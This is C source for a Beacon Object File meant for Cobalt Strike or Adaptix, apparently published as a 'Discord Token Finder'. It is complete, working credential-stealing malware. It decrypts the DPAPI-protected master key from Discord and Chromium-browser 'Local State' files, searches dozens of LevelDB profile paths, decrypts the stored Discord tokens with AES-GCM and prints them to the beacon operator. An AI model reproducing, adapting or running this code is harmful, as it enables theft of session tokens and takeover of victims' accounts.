/*
 * Author   : LeetIDA (github.com/LeetIDA)
 * discord_tokens.c - Discord Token Finder BOF
 * For Adaptix Framework / Cobalt Strike
 * Compiles to: discord_tokens.x64.o / discord_tokens.x86.o
 *
 * Cross-compile with:
 *   x86_64-w64-mingw32-gcc -c discord_tokens.c -o _bin/discord_tokens.x64.o
 *   i686-w64-mingw32-gcc -c discord_tokens.c -o _bin/discord_tokens.x86.o
 */

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include "beacon.h"

/* ---- Dynamic Function Resolution ---- */

/* Kernel32 */
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT void    WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$lstrlenA(LPCSTR);
DECLSPEC_IMPORT LPSTR   WINAPI KERNEL32$lstrcpyA(LPSTR, LPCSTR);
DECLSPEC_IMPORT LPSTR   WINAPI KERNEL32$lstrcatA(LPSTR, LPCSTR);
DECLSPEC_IMPORT int     WINAPI KERNEL32$lstrcmpA(LPCSTR, LPCSTR);

/* Crypt32 */
DECLSPEC_IMPORT BOOL    WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
DECLSPEC_IMPORT BOOL    WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

/* BCrypt */
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptSetProperty(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);

/* Shlwapi */
DECLSPEC_IMPORT BOOL    WINAPI SHLWAPI$PathFileExistsA(LPCSTR);

/* MSVCRT */
DECLSPEC_IMPORT int     __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT char*   __cdecl MSVCRT$strstr(const char*, const char*);
DECLSPEC_IMPORT char*   __cdecl MSVCRT$strchr(const char*, int);
DECLSPEC_IMPORT int     __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void    __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT char*   __cdecl MSVCRT$strncpy(char*, const char*, size_t);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT char*   __cdecl MSVCRT$strdup(const char*);
DECLSPEC_IMPORT void    __cdecl MSVCRT$free(void*);

/* ---- Macros ---- */
#define MAX_PATH_LEN 512
#define MAX_TOKENS   32
#define TOKEN_BUF    256
#define HEAP_ALLOC(sz) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define HEAP_FREE(p)   KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

/* CRT function redirects - needed by Windows SDK macros like BCRYPT_INIT_AUTH_MODE_INFO */
#define memset  MSVCRT$memset
#define memcpy  MSVCRT$memcpy
#define memcmp  MSVCRT$memcmp
#define strlen  MSVCRT$strlen
#define sprintf MSVCRT$sprintf

/* ---- Token storage ---- */
typedef struct {
    char token[TOKEN_BUF];
    char location[64];
} TokenEntry;

static TokenEntry g_tokens[MAX_TOKENS];
static int g_token_count = 0;

/* ---- Helpers ---- */

static int base64_decode(const char* input, unsigned char* output, int* out_len) {
    DWORD decoded_len = 0;
    if (!CRYPT32$CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL))
        return 0;
    if (!CRYPT32$CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &decoded_len, NULL, NULL))
        return 0;
    *out_len = (int)decoded_len;
    return 1;
}

static int decrypt_dpapi(unsigned char* in, int in_len, unsigned char** out, int* out_len) {
    DATA_BLOB inb  = { in_len, in };
    DATA_BLOB outb = { 0 };

    if (!CRYPT32$CryptUnprotectData(&inb, NULL, NULL, NULL, NULL, 0, &outb))
        return 0;

    *out = (unsigned char*)HEAP_ALLOC(outb.cbData);
    MSVCRT$memcpy(*out, outb.pbData, outb.cbData);
    *out_len = outb.cbData;
    KERNEL32$LocalFree(outb.pbData);
    return 1;
}

static int decrypt_aes_gcm(unsigned char* key, int key_len,
                           unsigned char* iv, int iv_len,
                           unsigned char* enc, int enc_len,
                           unsigned char* tag, int tag_len,
                           unsigned char* dec, int* dec_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS st;

    st = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st != 0) return 0;

    st = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                                  (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                  sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (st != 0) { BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    st = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);
    if (st != 0) { BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv;
    authInfo.cbNonce = iv_len;
    authInfo.pbTag   = tag;
    authInfo.cbTag   = tag_len;

    ULONG result = 0;
    st = BCRYPT$BCryptDecrypt(hKey, enc, enc_len, &authInfo,
                              NULL, 0, dec, enc_len, &result, 0);

    BCRYPT$BCryptDestroyKey(hKey);
    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);

    *dec_len = (int)result;
    return (st == 0);
}

/* ---- Get master key from Local State ---- */

static unsigned char* get_master_key(const char* local_state_path, int* key_len) {
    HANDLE hFile = KERNEL32$CreateFileA(local_state_path, GENERIC_READ, FILE_SHARE_READ,
                                        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD file_size = KERNEL32$GetFileSize(hFile, NULL);
    if (file_size == 0 || file_size > 10 * 1024 * 1024) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    char* content = (char*)HEAP_ALLOC(file_size + 1);
    DWORD bytes_read;
    KERNEL32$ReadFile(hFile, content, file_size, &bytes_read, NULL);
    content[bytes_read] = '\0';
    KERNEL32$CloseHandle(hFile);

    /* Find "encrypted_key":"..." */
    char* key_start = MSVCRT$strstr(content, "\"encrypted_key\":\"");
    if (!key_start) { HEAP_FREE(content); return NULL; }
    key_start += 17;

    char* key_end = MSVCRT$strchr(key_start, '"');
    if (!key_end) { HEAP_FREE(content); return NULL; }

    int b64_len = (int)(key_end - key_start);
    char* b64 = (char*)HEAP_ALLOC(b64_len + 1);
    MSVCRT$memcpy(b64, key_start, b64_len);
    b64[b64_len] = '\0';

    /* Base64 decode */
    unsigned char enc_key[512];
    int enc_key_len;
    if (!base64_decode(b64, enc_key, &enc_key_len) || enc_key_len <= 5) {
        HEAP_FREE(b64);
        HEAP_FREE(content);
        return NULL;
    }

    /* DPAPI decrypt (skip first 5 bytes "DPAPI") */
    unsigned char* master_key = NULL;
    int mk_len = 0;
    int ok = decrypt_dpapi(enc_key + 5, enc_key_len - 5, &master_key, &mk_len);

    HEAP_FREE(b64);
    HEAP_FREE(content);

    if (!ok) return NULL;
    *key_len = mk_len;
    return master_key;
}

/* ---- Search file for tokens ---- */

static void find_tokens_in_file(const char* filepath, unsigned char* master_key, int key_len,
                                const char* location) {
    HANDLE hFile = KERNEL32$CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD file_size = KERNEL32$GetFileSize(hFile, NULL);
    if (file_size == 0 || file_size > 50 * 1024 * 1024) {
        KERNEL32$CloseHandle(hFile);
        return;
    }

    unsigned char* content = (unsigned char*)HEAP_ALLOC(file_size + 1);
    DWORD bytes_read;
    KERNEL32$ReadFile(hFile, content, file_size, &bytes_read, NULL);
    content[bytes_read] = '\0';
    KERNEL32$CloseHandle(hFile);

    const char* marker = "dQw4w9WgXcQ:";
    const int marker_len = 12;

    for (DWORD i = 0; i + marker_len < bytes_read && g_token_count < MAX_TOKENS; i++) {
        if (MSVCRT$memcmp(&content[i], marker, marker_len) != 0)
            continue;

        DWORD data_start = i + marker_len;
        DWORD data_end = data_start;
        while (data_end < bytes_read &&
               content[data_end] != '\0' &&
               content[data_end] != '\n' &&
               content[data_end] != '\r' &&
               content[data_end] != '"' &&
               (data_end - data_start) < 500) {
            data_end++;
        }

        DWORD b64_len = data_end - data_start;
        if (b64_len == 0) continue;

        char* token_b64 = (char*)HEAP_ALLOC(b64_len + 1);
        MSVCRT$memcpy(token_b64, &content[data_start], b64_len);
        token_b64[b64_len] = '\0';

        unsigned char enc_token[512];
        int enc_token_len = 0;
        if (!base64_decode(token_b64, enc_token, &enc_token_len) || enc_token_len <= 31) {
            HEAP_FREE(token_b64);
            continue;
        }

        unsigned char* iv  = enc_token + 3;
        unsigned char* enc = enc_token + 15;
        int enc_len        = enc_token_len - 31;
        unsigned char* tag = enc_token + enc_token_len - 16;

        unsigned char dec[512];
        int dec_len = 0;

        if (master_key && decrypt_aes_gcm(master_key, key_len, iv, 12,
                                          enc, enc_len, tag, 16,
                                          dec, &dec_len)) {
            dec[dec_len] = '\0';

            /* Check for duplicate */
            int dup = 0;
            for (int j = 0; j < g_token_count; j++) {
                if (KERNEL32$lstrcmpA(g_tokens[j].token, (char*)dec) == 0) {
                    dup = 1;
                    break;
                }
            }

            if (!dup && g_token_count < MAX_TOKENS) {
                MSVCRT$strncpy(g_tokens[g_token_count].token, (char*)dec, TOKEN_BUF - 1);
                MSVCRT$strncpy(g_tokens[g_token_count].location, location, 63);
                g_token_count++;
            }
        }

        HEAP_FREE(token_b64);
    }

    HEAP_FREE(content);
}

/* ---- Scan LevelDB directory ---- */

static void scan_leveldb(const char* dir, unsigned char* master_key, int key_len,
                         const char* location) {
    char search[MAX_PATH_LEN];
    MSVCRT$sprintf(search, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        /* Check extension */
        char* ext = MSVCRT$strstr(fd.cFileName, ".ldb");
        if (!ext) ext = MSVCRT$strstr(fd.cFileName, ".log");
        if (!ext) continue;

        char full[MAX_PATH_LEN];
        MSVCRT$sprintf(full, "%s\\%s", dir, fd.cFileName);
        find_tokens_in_file(full, master_key, key_len, location);

    } while (KERNEL32$FindNextFileA(hFind, &fd) && g_token_count < MAX_TOKENS);

    KERNEL32$FindClose(hFind);
}

/* ---- Path definitions ---- */

typedef struct {
    const char* subpath;       /* relative path from env var to leveldb */
    const char* local_state;   /* relative path from env var to Local State */
    const char* label;         /* display name */
    int use_appdata;           /* 1 = APPDATA, 0 = LOCALAPPDATA */
} ScanPath;

static const ScanPath SCAN_PATHS[] = {
    /* Discord apps */
    {"\\discord\\Local Storage\\leveldb", "\\discord\\Local State", "Discord", 1},
    {"\\discordcanary\\Local Storage\\leveldb", "\\discordcanary\\Local State", "DiscordCanary", 1},
    {"\\discordptb\\Local Storage\\leveldb", "\\discordptb\\Local State", "DiscordPTB", 1},
    {"\\discorddevelopment\\Local Storage\\leveldb", "\\discorddevelopment\\Local State", "DiscordDev", 1},
    {"\\lightcord\\Local Storage\\leveldb", "\\lightcord\\Local State", "Lightcord", 1},
    /* Chrome */
    {"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome", 0},
    {"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P1", 0},
    {"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P2", 0},
    {"\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P3", 0},
    {"\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P4", 0},
    {"\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P5", 0},
    {"\\Google\\Chrome\\User Data\\Guest Profile\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome Guest", 0},
    {"\\Google\\Chrome\\User Data\\Default\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome Net", 0},
    {"\\Google\\Chrome\\User Data\\Profile 1\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P1 Net", 0},
    {"\\Google\\Chrome\\User Data\\Profile 2\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P2 Net", 0},
    {"\\Google\\Chrome\\User Data\\Profile 3\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P3 Net", 0},
    {"\\Google\\Chrome\\User Data\\Profile 4\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P4 Net", 0},
    {"\\Google\\Chrome\\User Data\\Profile 5\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome P5 Net", 0},
    {"\\Google\\Chrome\\User Data\\Guest Profile\\Network\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Local State", "Chrome Guest Net", 0},
    /* Opera */
    {"\\Opera Software\\Opera Stable\\Local Storage\\leveldb", "\\Opera Software\\Opera Stable\\Local State", "Opera", 1},
    {"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", "\\Opera Software\\Opera GX Stable\\Local State", "OperaGX", 1},
    /* Brave */
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P1", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P2", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P3", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P4", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P5", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave Guest", 0},
    /* Yandex */
    {"\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P1", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P2", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P3", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P4", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P5", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex Guest", 0},
    /* Edge */
    {"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P1", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P2", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P3", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P4", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P5", 0},
    {"\\Microsoft\\Edge\\User Data\\Guest Profile\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge Guest", 0},
    /* Brave Network */
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P1 Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P2 Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P3 Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P4 Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave P5 Net", 0},
    {"\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Brave Guest Net", 0},
    /* Yandex Network */
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P1 Net", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P2 Net", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P3 Net", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P4 Net", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex P5 Net", 0},
    {"\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\Local Storage\\leveldb", "\\Yandex\\YandexBrowser\\User Data\\Local State", "Yandex Guest Net", 0},
    /* Edge Network */
    {"\\Microsoft\\Edge\\User Data\\Default\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P1 Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P2 Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P3 Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P4 Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge P5 Net", 0},
    {"\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\Local Storage\\leveldb", "\\Microsoft\\Edge\\User Data\\Local State", "Edge Guest Net", 0},
    {NULL, NULL, NULL, 0}
};

/* ---- BOF Entry Point ---- */

void go(char* args, int alen) {
    /* Reset globals */
    g_token_count = 0;
    MSVCRT$memset(g_tokens, 0, sizeof(g_tokens));

    char appdata[MAX_PATH_LEN];
    char localappdata[MAX_PATH_LEN];
    MSVCRT$memset(appdata, 0, MAX_PATH_LEN);
    MSVCRT$memset(localappdata, 0, MAX_PATH_LEN);

    KERNEL32$GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH_LEN);
    KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH_LEN);

    int scanned_count = 0;

    /* Key cache: heap-allocated to avoid ___chkstk_ms */
    #define MAX_CACHE 10
    char** cached_paths = (char**)HEAP_ALLOC(MAX_CACHE * sizeof(char*));
    unsigned char** cached_keys = (unsigned char**)HEAP_ALLOC(MAX_CACHE * sizeof(unsigned char*));
    int* cached_lens = (int*)HEAP_ALLOC(MAX_CACHE * sizeof(int));
    int cache_count = 0;

    for (int c = 0; c < MAX_CACHE; c++) {
        cached_paths[c] = (char*)HEAP_ALLOC(MAX_PATH_LEN);
    }

    for (int i = 0; SCAN_PATHS[i].subpath != NULL; i++) {
        char leveldb_path[MAX_PATH_LEN];
        char local_state_path[MAX_PATH_LEN];
        const char* base = SCAN_PATHS[i].use_appdata ? appdata : localappdata;

        MSVCRT$sprintf(leveldb_path, "%s%s", base, SCAN_PATHS[i].subpath);
        MSVCRT$sprintf(local_state_path, "%s%s", base, SCAN_PATHS[i].local_state);

        if (!SHLWAPI$PathFileExistsA(leveldb_path))
            continue;

        scanned_count++;

        /* Check key cache */
        unsigned char* master_key = NULL;
        int key_len = 0;
        int found_cached = 0;

        for (int c = 0; c < cache_count; c++) {
            if (KERNEL32$lstrcmpA(cached_paths[c], local_state_path) == 0) {
                master_key = cached_keys[c];
                key_len = cached_lens[c];
                found_cached = 1;
                break;
            }
        }

        if (!found_cached && SHLWAPI$PathFileExistsA(local_state_path)) {
            master_key = get_master_key(local_state_path, &key_len);
            if (master_key && cache_count < MAX_CACHE) {
                KERNEL32$lstrcpyA(cached_paths[cache_count], local_state_path);
                cached_keys[cache_count] = master_key;
                cached_lens[cache_count] = key_len;
                cache_count++;
            }
        }

        scan_leveldb(leveldb_path, master_key, key_len, SCAN_PATHS[i].label);
    }

    /* ---- Output results ---- */
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n"
        "  Discord Token Finder BOF\n"
        "  github.com/LeetIDA\n"
        "  Scanned %d location(s)\n",
        scanned_count);

    if (g_token_count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  Status  : No tokens found\n"
            "  Result  : Clean\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  Status  : %d token(s) extracted\n"
            "  ----------------------------------------\n",
            g_token_count);
        for (int i = 0; i < g_token_count; i++) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%d] %-16s %s\n",
                i + 1, g_tokens[i].location, g_tokens[i].token);
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "  ----------------------------------------\n");
    }

    /* Free cached keys and cache arrays */
    for (int c = 0; c < cache_count; c++) {
        HEAP_FREE(cached_keys[c]);
    }
    for (int c = 0; c < MAX_CACHE; c++) {
        HEAP_FREE(cached_paths[c]);
    }
    HEAP_FREE(cached_paths);
    HEAP_FREE(cached_keys);
    HEAP_FREE(cached_lens);
}
